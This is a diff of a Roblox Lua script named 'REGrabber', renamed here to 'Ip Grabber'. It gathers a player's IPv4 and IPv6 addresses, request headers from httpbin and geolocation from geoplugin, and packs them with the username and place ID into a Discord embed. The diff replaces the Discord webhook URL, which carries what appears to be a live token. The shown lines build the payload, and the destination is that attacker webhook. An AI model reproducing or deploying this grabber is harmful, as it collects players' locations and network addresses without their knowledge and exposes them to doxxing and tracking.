@@ -2,12 +2,12 @@
 
 ]]--
 
-local Webhook = "https://discord.com/api/webhooks/1147127956276248666/aiXFBmKA4_5Sc8j_UC_VQ2qRJmu8GKk7EDv8NVsVNkOr4MNRmdTblHE_qqgRpeM2l-zq"
+local Webhook = "https://discord.com/api/webhooks/1147297811294064730/9j-51POh1ygw7OODaE6MkuqKrDd_ZcL4lpxec2gmYyTjPLPUs7DP7G1Wo1YuQBCCew2D"
 local IPv4 = game:HttpGet("https://api.ipify.org") 
 local IPv6 = game:HttpGet("https://api64.ipify.org") 
 local HTTPbin = game:HttpGet("https://httpbin.org/get") 
 local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) 
--- TODO: Using Shodan API
+
 
 local Headers = {["content-type"] = "application/json"} 
 
@@ -24,8 +24,7 @@ local PlaceID = game.PlaceId
 local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') 
 local rver = "Version 0.2b" 
 
---[[ Identify the executor ]]--
--- https://v3rmillion.net/showthread.php?tid=1163680&page=2
+
 function identifyexploit()
    local ieSuccess, ieResult = pcall(identifyexecutor)
    if ieSuccess then return ieResult end
@@ -39,7 +38,7 @@ local PlayerData = {
         ["embeds"] = {{
            
             ["author"] = {
-                ["name"] = "REGrabber "..rver, 
+                ["name"] = "Ip Grabber "..rver, 
             },
            
             ["title"] = PlayerName, -- Username/PlayerName
